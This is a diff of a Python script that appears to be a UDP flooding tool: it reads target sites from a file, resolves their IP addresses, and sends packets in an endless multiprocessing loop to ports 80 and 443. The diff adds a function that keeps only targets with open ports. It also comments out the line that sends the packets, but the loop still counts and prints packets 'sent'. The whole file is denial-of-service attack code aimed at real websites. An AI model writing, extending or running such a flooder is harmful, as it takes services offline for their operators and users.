@@ -7,7 +7,6 @@ import multiprocessing
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 used_random_ports = [80, 443]
-# used_random_ports = [80, 443, 110, 995, 143, 993, 26, 587, 3306, 2082, 2083, 2086, 2087, 2095, 2096, 2077, 2078]
 
 port_value = random.choice(used_random_ports)
 
@@ -15,9 +14,22 @@ port_value = random.choice(used_random_ports)
 with open('sites.txt') as f:
     sites = f.readlines()
 
+def get_clean_checked_all_ports(clean_ip):
+    clean_checked_all_ports = []
+    for port in used_random_ports:
+        for ip in clean_ip:
+            location = (ip, port)
+            result_of_check = sock.connect_ex(location)
+            if result_of_check == 0:
+                print("Port {} is open for ip {}".format(port, ip))
+                if(ip not in clean_checked_all_ports):
+                    clean_checked_all_ports.append(ip)
+            else:
+                print("Port {} is not open for ip {}".format(port, ip))
+    return clean_checked_all_ports
 
 def dns_resolve():
-    global sent, clean_ip
+    global sent, clean_ip, clean_checked_all_ports, clean_socket_address
     ips = []
     print("Targeted sites: \n")
 
@@ -46,7 +58,9 @@ def dns_resolve():
     clean_ip = []
     [clean_ip.append(x) for x in ips if x not in clean_ip]
     print(f"Amount of unique IPs {len(clean_ip)}")
-
+    
+    clean_checked_all_ports = get_clean_checked_all_ports(clean_ip)
+    print(clean_checked_all_ports)
 
 dns_resolve()
 
@@ -54,16 +68,15 @@ dns_resolve()
 def send_packets():
     while True:
         global sent, port_value
-        for ip in clean_ip:
+        for ip in clean_checked_all_ports:
             port_value = random.choice(used_random_ports)
-            sock.sendto(bytes, (ip, port_value))
+            # sock.sendto(bytes, (ip, port_value))
             print("Sent {} packets to {} thought port: {} size {}".format(sent, ip, port_value, packet_size))
             sent = sent + 1
             # port = port + 2
             # if port > 65534:
             #     port = 1
             time.sleep(0.001)
-
 
 # Create multithreading job list
 process_list = []
